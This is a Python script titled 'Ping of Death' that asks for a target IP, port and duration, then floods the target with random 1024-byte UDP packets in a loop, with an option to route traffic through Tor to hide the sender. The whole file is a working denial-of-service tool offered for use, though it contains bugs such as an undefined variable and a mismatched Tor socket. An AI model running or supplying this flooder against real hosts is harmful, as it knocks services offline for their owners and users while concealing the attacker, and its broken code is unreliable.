import os
import sys
import time
import socket
import random
import socks
import datetime

class PingOfDeath(object):
        def __init__(self, hostip, port, usetor, timeout):
                
                
                self.hostip = hostip
                self.port = port
                self.usetor = UseTor
                self.timeout= timeout
                if self.usetor:
                    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9150)
         
               
                self.byts = random._urandom(1024)
                self.sent = 0
                
        def udpSpray(self):
                        while(True):
                                try:
                                        if time.time()>self.timeout:
                                                break
                                        else:
                                                pass
                                        if self.usetor:
                                                sock = socks.socksocket()
                                                
                                           
                                        else:
                                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                        sock.sendto(self.byts,(self.hostip,self.port))
                                        self.sent=self.sent+1
                                        print('Sent %s packets to %s through port %s'%(self.sent,self.hostip,self.port))
                                except KeyboardInterrupt:
                                        sys.exit()
                        

os.system('cls')#clear for linux 
print('-------------------Welcome to the Ping of Death-------------')
print('written by - @manasec\n\n')
hostip= input('Target IP: ')
port = int(input('Port:'))
duration = int(input('Time:'))
timeout = time.time()+duration
t = input('Do you want to use Tor (y/n): ').lower()
usetor = False


if t == 'y':
    usetor = True


print('\n\n[*] Starting The Attack At %s...' % (time.strftime("%H:%M:%S")))

pog = PingOfDeath(hostip, port,usetor, timeout)
pog.udpSpray()
 






 

 

 

 

